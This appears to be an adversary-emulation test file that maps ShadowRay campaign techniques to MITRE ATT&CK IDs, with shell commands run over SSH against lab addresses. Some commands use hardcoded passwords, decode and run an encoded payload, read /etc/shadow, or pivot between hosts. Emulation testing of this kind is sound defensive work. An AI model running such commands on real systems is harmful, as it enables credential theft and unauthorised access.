name: T1190 - Exploit Public-Facing Application
description: During ShadowRay, threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.

name: T1027.013 - Encrypted/Encoded File
description: During ShadowRay, threat actors used Base64-encrypted Python code to evade detection.

executors.name: sh
executors.command: sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'base64 -d /tmp/encoded_payload.b64 > /tmp/payload.py && python3 /tmp/payload.py'

name: T1003.008 - /etc/passwd and /etc/shadow
description: During ShadowRay, threat actors used `cat /etc/shadow` to steal password hashes.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sudo cat /etc/passwd' && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sudo cat /etc/shadow'

name: T1546.004 - Unix Shell Configuration Modification
description: During ShadowRay, threat actors executed commands on interactive and reverse shells.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 echo '$(whoami) on $(uname -n)'

name: T1588.002 - Tool
description: During ShadowRay, threat actors used tools including the XMRig miner and Interactsh.

executors.name: sh
executors.command: sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'nmap localhost 2>&1'

name: T1105 - Ingress Tool Transfer
description: During ShadowRay, threat actors downloaded and executed the XMRig miner on targeted hosts.

executors.name: sh
executors.command: sshpass -p 'Passw0rd'  ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 "echo 'mining crypto coins'"

name: T1059.006 - Python
description: During ShadowRay, threat actors used the Python `pty` module to open reverse shells.

name: T1016 - System Network Configuration Discovery
description: During ShadowRay, threat actors invoked DNS queries from targeted machines to identify their IP addresses.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@172.21.0.20 'ip -brief a; ip r; ip neigh; hostname -I; sshpass -p "Passw0rd" ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@172.22.0.20 "ip -brief a; ip r; ip neigh; hostname -I"'

name: T1068 - Exploitation for Privilege Escalation
description: During ShadowRay, threat actors downloaded a privilege escalation payload to gain root access.

name: T1496.001 - Compute Hijacking
description: During ShadowRay, threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining.
